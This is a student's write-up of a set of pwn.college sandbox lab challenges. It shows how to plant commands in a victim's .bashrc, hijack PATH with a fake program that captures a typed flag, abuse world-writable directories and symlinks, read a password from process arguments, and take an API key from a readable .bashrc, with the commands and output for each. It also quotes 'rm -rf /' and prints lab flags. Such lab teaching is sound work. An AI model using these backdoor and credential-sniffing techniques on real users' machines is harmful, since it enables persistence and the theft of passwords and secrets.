# Silly Shenanigans

## Bashrc Backdoor
When your shell starts up, it looks for .bashrc file in your home directory and executes it as a startup script. You can customize your /home/hacker/.bashrc with useful things, such as setting environment variables, tweaking your shell configuration, and so on.

You can also use it for evil! An unwitting victim's .bashrc is a common target for shenanigans. Imagine sneaking onto your friend's computer and adding a echo "Hackers were here!" at the end of their .bashrc. That's funny, but the same capability can be used for much more nefarious purposes. Malicious software, for example, often targets startup scripts such as .bashrc to maintain persistence into the future!

In this challenge, we'll pretend that you've broken into a victim user's machine! That user is named zardus, with a home directory of /home/zardus. You, as the hacker user, have write access to his .bashrc, and zardus has read-access to /flag. The victim is simulated by the script /challenge/victim, and you can launch this script at any time to observe the victim logging into the computer. Can you get the flag?

HINT: Like the scripts you explored in Chaining Commands, the .bashrc script is just a shell script. Adding a new line with a command on it (e.g., echo Hello Hackers) will get that command executed, so all you really need to think about is what command will get you the flag!

NOTE: The victim's /home/zardus/.bashrc will have a lot of stuff already in it: the shell's startup is a complex affair. Don't panic --- just add your payload to the end and hope for the best!

HINT: Need to poke around as zardus to debug your solution? In practice mode, you can use sudo su --login zardus to drop into a Zardus session!

### Solve
**Flag:** `pwn.college{83noPy3GGUWbyrsn5tcXYoNndCt.0VMzEzNxwSN1gjNzEzW}`
 for this Challenge,i opened the .bashrc script and added cat /flag and pipe the output into a text file in a publicaly readable directory like tmp as zardus user can't create a file in hacker user directory . Then i ran /challenge/victim to simulate zardus user and then i catted the text file to get the flag.

```bash 
hacker@shenanigans~bashrc-backdoor:~$ nano /home/zardus/.bashrc
# this sets up a scary red shell prompt!
PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$ '

# add your attack below this line!
cat /flag > /tmp/flag1.txt
hacker@shenanigans~bashrc-backdoor:/$ /challenge/victim
Username: zardus
Password: ***********
zardus@shenanigans~bashrc-backdoor:~$ exit
logout
hacker@shenanigans~bashrc-backdoor:/$ cat /tmp/flag1.txt
pwn.college{83noPy3GGUWbyrsn5tcXYoNndCt.0VMzEzNxwSN1gjNzEzW}
```

### New Learnings
I learned how the .bashrc of a user can exploited to carry out commands that can only be executed by that particular user with permission.

### References

## Sniffing Input
In the previous level, you abused Zardus's ~/.bashrc to make him run commands for you.

This time, Zardus doesn't keep the flag lying around in a readable file after he logs in. Instead he'll run a command named flag_checker, manually typing the flag into it for verification.

Your mission is to use your continued write access to Zardus's .bashrc to intercept this flag. Remember how you hijacked commands in the Pondering PATH module? Can you use that capability to hijack the flag_checker?

HINT: Is Zardus getting spooked by your hijack? He's careful --- he checks for the flag_checker prompt of Type the flag. Make sure your hijack also prints this prompt (e.g., echo "Type the flag"). Other than printing that prompt, your fake flag_checker can either just a) cat Zardus's input to stdout (e.g., cat with no arguments) or b) read it into a variable and echo it out. Up to you!

HINT: Don't forget to make your fake flag_checker executable, like you learned in the Perceiving Permissions module!

### Solve
**Flag:** `pwn.college{QTKWCQamGVCzW_DgP1RpEtOkllJ.0VNzEzNxwSN1gjNzEzW}`
 for this Challenge,i created a new directory in hacker directory and created a script called flag_checker and added the required text output for zardus and take the inputed flag from zardus and transfer it into a text file in a publicaly readable directory like tmp as zardus user can't create a file in hacker user directory.Then i made it executable and opened the zardus's .bashrc script and updated the PATH variable with /home/hacker/new at the beginning. Then i ran /challenge/victim to simulate zardus user and then i catted the text file to get the flag.

```bash 
hacker@shenanigans~sniffing-input:~$ mkdir ~/new
hacker@shenanigans~sniffing-input:~$ nano ~/new/flag_checker
#!/bin/bash
echo "Type the flag" 
cat > /tmp/flag1.txt
hacker@shenanigans~sniffing-input:~$ chmod +x ~/new/flag_checker
hacker@shenanigans~sniffing-input:~$ echo 'export PATH=/home/hacker/new:$PATH' >> /home/zardus/.bashrc
hacker@shenanigans~sniffing-input:~$ /challenge/victim
Username: zardus
Password: ***********
zardus@shenanigans~sniffing-input:~$ flag_checker
Type the flag
*************************************************************exit
^Z
[2]+  Stopped                 /challenge/victim
hacker@shenanigans~sniffing-input:~$ cat /tmp/flag1.txt
pwn.college{QTKWCQamGVCzW_DgP1RpEtOkllJ.0VNzEzNxwSN1gjNzEzW}
```

### New Learnings
I learned how the PATH variable can be altered to get .bashrc of a user to carry out commands that we need them to do.

### References

## Overshared Directories
Alright, Zardus has wised up --- why would he have a writable .bashrc, anyways? But a more common scenario is that users on the same system, to make it easier to collaborate, will make their home directories world writable. What's the problem here?

The problem is that a subtlety of Linux file/directory permissions is that anyone with write access to a directory can move and delete files in it. For example, let's say that Zardus has a world-writable directory for collaboration:

```bash
zardus@dojo:~$ mkdir /tmp/collab
zardus@dojo:~$ chmod a+w /tmp/collab
zardus@dojo:~$ echo "do pwn.college" > /tmp/collab/todo-list
```

And then a hacker comes along and does the following, despite not owning the todo-list file!

```bash
hacker@dojo:~$ ls -l /tmp/collab/todo-list
-rw-r--r-- 1 zardus zardus 15 Jun  6 13:12 /tmp/collab/todo-list
hacker@dojo:~$ rm /tmp/collab/todo-list
rm: remove write-protected regular file '/tmp/collab/todo-list'? y
hacker@dojo:~$ echo "send hacker money" > /tmp/collab/todo-list
hacker@dojo:~$ ls -l /tmp/collab/todo-list
-rw-r--r-- 1 hacker hacker 18 Jun  6 13:12 /tmp/collab/todo-list
hacker@dojo:~$
```
This might seem counterintuitive: hacker has no write access to the todo-list but the end result is that they can change the content. But think about it this way: a file's connection to a directory lives in the directory in the end, and users with write access to that directory can mess with it. Of course, this has security implications when important directories are world-writable.

In this challenge, for convenience, Zardus opened up his home directory:

```bash
zardus@dojo:~$ chmod a+w /home/zardus
```
As you know, there are lots of sensitive files in that directory such as .bashrc! Can you replicate the previous attack with write access to /home/zardus instead of /home/zardus/.bashrc?

### Solve
**Flag:** `pwn.college{4GLYy1PaKbbd0pBF-LhzO4pgSYc.0FM0EzNxwSN1gjNzEzW}`
 for this Challenge,i followed initial steps of previous challenge and then i moved the original .bashrc to a new directory within zardus directory and made i create a fake .bashrc script Then i made it executable and opened the zardus's .bashrc script and updated the PATH variable with /home/hacker/new at the beginning. Then i ran /challenge/victim to simulate zardus user and then i catted the text file to get the flag.

```bash 
hacker@shenanigans~overshared-directories:~$ mkdir new
hacker@shenanigans~overshared-directories:~$ nano ~/new/flag_checker
hacker@shenanigans~overshared-directories:~$ chmod +x ~/new/flag_checker
hacker@shenanigans~overshared-directories:~$ mkdir  /home/zardus/new2
hacker@shenanigans~overshared-directories:~$ mv /home/zardus/.bashrc /home/zardus/new2
hacker@shenanigans~overshared-directories:~$ nano /home/zardus/.bashrc
hacker@shenanigans~overshared-directories:~$ /challenge/victim
Username: zardus
Password: **********
zardus@shenanigans~overshared-directories:~$ flag_checker
Type the flag
*************************************************************exit
^Z
[2]+  Stopped                 /challenge/victim
hacker@shenanigans~overshared-directories:~$ cat /tmp/flag1.txt
pwn.college{4GLYy1PaKbbd0pBF-LhzO4pgSYc.0FM0EzNxwSN1gjNzEzW}
exit
```

### New Learnings
I learned how the PATH variable can be altered to get .bashrc of a user to carry out commands that we need them to do.

### References

## Tricky Linking
Okay, Zardus has wised up! No more sharing the home directory: despite the reduced convenience, Zardus has moved to sharing /tmp/collab. He's made that directory world-readable and has started a list of evil commands to remember!

```bash
zardus@dojo:~$ mkdir /tmp/collab
zardus@dojo:~$ chmod a+w /tmp/collab
zardus@dojo:~$ echo "rm -rf /" > /tmp/collab/evil-commands.txt
```
In this challenge, when you run /challenge/victim, Zardus will add cat /flag to that list of commands:

```bash
hacker@dojo:~$ /challenge/victim

Username: zardus
Password: **********
zardus@dojo:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@dojo:~$ exit
logout
hacker@dojo:~$
```
Recall from the previous level that, having write access to /tmp/collab, the hacker user can replace that evil-commands.txt file. Also remember from Comprehending Commands that files can link to other files. What happens if hacker replaces evil-commands.txt with a symbolic link to some sensitive file that zardus can write to? Chaos and shenanigans!

You know the file to link to. Pull off the attack, and get /flag (which, for this level, Zardus can read again!).

HINT: You'll need to run /challenge/victim twice: once to get cat /flag written to where you want, and once to trigger it!

Is /tmp dangerous to use??? Despite the attack shown here, /tmp can be used safely. The directory is world-writable, but has a special permission bit set:

```bash
hacker@dojo:~$ ls -ld /tmp
```
drwxrwxrwt 29 root root 1056768 Jun  6 14:06 /tmp
hacker@dojo:~$
That t bit at the end is the sticky bit. The sticky bit means that the directory only allows the owners of files to rename or remove files in the directory. It's designed to prevent this exact attack! The problem in this challenge, of course, was that Zardus did not enable the sticky bit on /tmp/collab. This would have closed the hole in this specific case:

```bash
zardus@dojo:~$ chmod +t /tmp/collab
```
Of course, shared resources like world-writable directories are still dangerous. Much later, in the Race Conditions of the Green Belt material, you'll see many ways in which such resources can cause security issues!

### Solve
**Flag:** `pwn.college{4R97_HbOm4r4Ci3URzozhsnsIoo.0VM0EzNxwSN1gjNzEzW}`
 for this Challenge,i removed the target file evil_commands and made a same filename as symbolic link to zardus's .bashrc script.Then i ran /challenge/victim twice to get the flag.

```bash 
hacker@shenanigans~tricky-linking:~$ rm -f /tmp/collab/evil-commands.txt
hacker@shenanigans~tricky-linking:~$ ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt
hacker@shenanigans~tricky-linking:~$ /challenge/victim
Username: zardus
Password: ***********
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@shenanigans~tricky-linking:~$ exit
logout
hacker@shenanigans~tricky-linking:~$ /challenge/victim
Username: zardus
Password: ***********
pwn.college{4R97_HbOm4r4Ci3URzozhsnsIoo.0VM0EzNxwSN1gjNzEzW}
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@shenanigans~tricky-linking:~$ exit
logout
```

### New Learnings
I learned how a symbolic link can used in a .bashrc script to exploit the user to execute a some other program which the use has the permission.

### References

## Sniffing Process Arguments
Poor Zardus; you've hacked him pretty heavily. But he's wisened up and secured his home directory! Game over?

Not quite! One of the things that people often don't think about when there are multiple accounts on one computer is what kind of data their command invocations leak. Remember, when you do ps aux, you get:

```bash
hacker@dojo:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
hacker         1  0.0  0.0   1128     4 ?        Ss   05:34   0:00 /sbin/docker-init -- /bin/sleep 6h
hacker         7  0.0  0.0   2736   580 ?        S    05:34   0:00 /bin/sleep 6h
hacker       102  0.4  0.0 723944 64660 ?        Sl   05:34   0:00 /usr/lib/code-server/lib/node /usr/lib/code-serve
hacker       138  3.3  0.0 968792 106272 ?       Sl   05:34   0:07 /usr/lib/code-server/lib/node /usr/lib/code-serve
hacker       287  0.0  0.0 717648 53136 ?        Sl   05:34   0:00 /usr/lib/code-server/lib/node /usr/lib/code-serve
hacker       318  3.3  0.0 977472 98256 ?        Sl   05:34   0:06 /usr/lib/code-server/lib/node --dns-result-order=
hacker       554  0.4  0.0 650560 55360 ?        Rl   05:35   0:00 /usr/lib/code-server/lib/node /usr/lib/code-serve
hacker       571  0.0  0.0   4600  4032 pts/0    Ss   05:35   0:00 /usr/bin/bash --init-file /usr/lib/code-server/li
hacker      1172  0.0  0.0   5892  2924 pts/0    R+   05:38   0:00 ps aux
hacker@dojo:~$
```
But what would happen if one of the arguments of one of those commands was something sensitive, like the flag or a password? This happens, and nefarious users sharing the same machine (or somehow otherwise listing processes on it) can steal that data and use it!

That's what this challenge explores. Zardus is using an automation script, passing his account password to it as an argument. Zardus is also allowed to use sudo (and, thus, to sudo cat /flag!). Steal the password, log in to Zardus' account (recall the su command from the Untangling Users module), and get that flag!

### Solve
**Flag:** `pwn.college{kePP5nbRdLbE5cIpZrOamw3luwN.0FOzEzNxwSN1gjNzEzW}`
 for this Challenge,i found that /challenge/victim has been modified to /challenge/bin/auto.sh by checking all the directories in /challenges. Then i ran /challenge/bin/auto.sh and theni again ran /challenge/bin/auto.sh chaining with ps aux using & to find the command with the password as argument.I found the password and then i logged in as zardus and sudo catted the /flag .

```bash 
hacker@shenanigans~sniffing-process-arguments:~$ /challenge/bin/auto.sh
This isn't the way to get the flag! If you already sniffed Zardus' password, use 'su' to log into his account and his 'sudo' access to cat the flag!
^Z
[5]+  Stopped                 /challenge/bin/auto.sh
hacker@shenanigans~sniffing-process-arguments:~$ /challenge/bin/auto.sh & ps aux
[6] 240
This isn't the way to get the flag! If you already sniffed Zardus' password, use 'su' to log into his account and his 'sudo' access to cat the flag!
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   1056   640 ?        Ss   19:17   0:00 /sbin/docker-init -- /nix/var/nix/profiles/dojo-workspace/bin/dojo-init /run/dojo/bin/sle
root           7  0.0  0.0 231708  2560 ?        S    19:17   0:00 /run/dojo/bin/sleep 6h
root         147  0.0  0.0   5204  3520 ?        S    19:17   0:00 su -c auto.sh --user zardus --pass pw_1933626506 zardus
zardus       151  0.0  0.0   4132  2560 ?        Ss   19:17   0:00 /bin/bash /run/challenge/bin/auto.sh --user zardus --pass pw_1933626506
zardus       152  0.0  0.0 231708  2560 ?        S    19:17   0:00 sleep 6h
hacker       156  0.0  0.0 231576  3520 pts/0    Ss   19:17   0:00 /nix/store/0nxvi9r5ymdlr2p24rjj9qzyms72zld1-bash-interactive-5.2p37/bin/bash /run/dojo/bi
hacker       162  0.0  0.0 232456  4480 pts/0    S    19:17   0:00 /run/dojo/bin/bash --login
hacker       180  0.0  0.0  36972 21760 ?        Sl   19:17   0:00 /nix/store/g0q8n7xfjp7znj41hcgrq893a9m0i474-ttyd-1.7.7/bin/ttyd --port 7681 --interface 0
hacker       184  0.0  0.0 231940  4160 pts/1    Ss+  19:17   0:00 /run/dojo/bin/bash --login
hacker       200  0.0  0.0   5656  2560 pts/0    T    19:21   0:00 /bin/bash /challenge/bin/auto.sh
hacker       201  0.0  0.0 231708  2560 pts/0    T    19:21   0:00 sleep 6h
hacker       210  0.0  0.0   5656  2880 pts/0    T    19:27   0:00 /bin/bash /challenge/bin/auto.sh
hacker       211  0.0  0.0 231708  2560 pts/0    T    19:27   0:00 sleep 6h
hacker       213  0.0  0.0   5656  2880 pts/0    S    19:29   0:00 /bin/bash /challenge/bin/auto.sh
hacker       215  0.0  0.0 231708  2560 pts/0    S    19:29   0:00 sleep 6h
hacker       235  0.0  0.0   5656  2880 pts/0    S    19:31   0:00 /bin/bash /challenge/bin/auto.sh
hacker       237  0.0  0.0 231708  2560 pts/0    S    19:31   0:00 sleep 6h
hacker       238  0.0  0.0   5656  2880 pts/0    T    19:31   0:00 /bin/bash /challenge/bin/auto.sh
hacker       239  0.0  0.0 231708  2560 pts/0    T    19:31   0:00 sleep 6h
hacker       240  0.0  0.0   5656  2880 pts/0    S    19:31   0:00 /bin/bash /challenge/bin/auto.sh
hacker       241  0.0  0.0 233600  3840 pts/0    R+   19:31   0:00 ps aux
hacker       242  0.0  0.0 231708  2560 pts/0    S    19:31   0:00 sleep 6h
hacker@shenanigans~sniffing-process-arguments:~$ su zardus
Password:
zardus@shenanigans~sniffing-process-arguments:/home/hacker$ sudo cat /flag
pwn.college{kePP5nbRdLbE5cIpZrOamw3luwN.0FOzEzNxwSN1gjNzEzW}
```

### New Learnings
I learned how sensitive data can be found as process arguments and how to get to that data by checking while a particular process has been executed.

### References

## Snooping on Configurations
Even without making mistakes, users might inadvertently leave themselves at risk. For example, many files in a typical user's home directory are world-readable by default, despite frequently being used to store sensitive information. Believe it or not, your .bashrc is world-readable unless you explicitly change it!

hacker@dojo:~$ ls -l ~/.bashrc
-rw-r--r-- 1 hacker hacker 148 Jun  7 05:56 /home/hacker/.bashrc
hacker@dojo:~$
You might think, "Hey, at least it's not world-writable by default"! But even world-readable, it can do damage. Since .bashrc is processed by the shell at startup, that is where people typically put initializations for any environment variables they want to customize. Most of the time, this is innocuous things like PATH, but sometimes people store API keys there for easy access. For example, in this challenge:

zardus@dojo:~$ echo "FLAG_GETTER_API_KEY=sk-XXXYYYZZZ" > ~/.bashrc
Afterwards, Zardus can easily refer to the API key. In this level, users can use a valid API key to get the flag:

zardus@dojo:~$ flag_getter --key $FLAG_GETTER_API_KEY
Correct API key! Do you want me to print the key (y/n)? y
pwn.college{HACKED}
zardus@dojo:~$
Naturally, Zardus stores his key in .bashrc. Can you steal the key and get the flag?

NOTE: When you get the API key, just execute flag_getter as the hacker user. This challenge's /challenge/victim is just for theming: you don't need to use it.

### Solve
**Flag:** `pwn.college{wQiOPfAMEVugYzFifnx_1UqYX6G.0lM0EzNxwSN1gjNzEzW}`
 for this Challenge,i catted the zardus' .bashrc and found the api key at the end and then i ran the flag_checker with this key to get the flag .

```bash 
hacker@shenanigans~snooping-on-configurations:~$ cat /home/zardus/.bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
        # We have color support; assume it's compliant with Ecma-48
        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
        # a case would tend to support setf rather than setaf.)
        color_prompt=yes
    else
        color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# Add an "alert" alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
FLAG_GETTER_API_KEY=sk-3074312596
hacker@shenanigans~snooping-on-configurations:~$ flag_getter --key sk-3074312596
Correct API key! Do you want me to print the flag (y/n)?
y
pwn.college{wQiOPfAMEVugYzFifnx_1UqYX6G.0lM0EzNxwSN1gjNzEzW}
```

### New Learnings
I learned how even just readable .bashrc can be exploited to find any sensitive data like API keys.

### References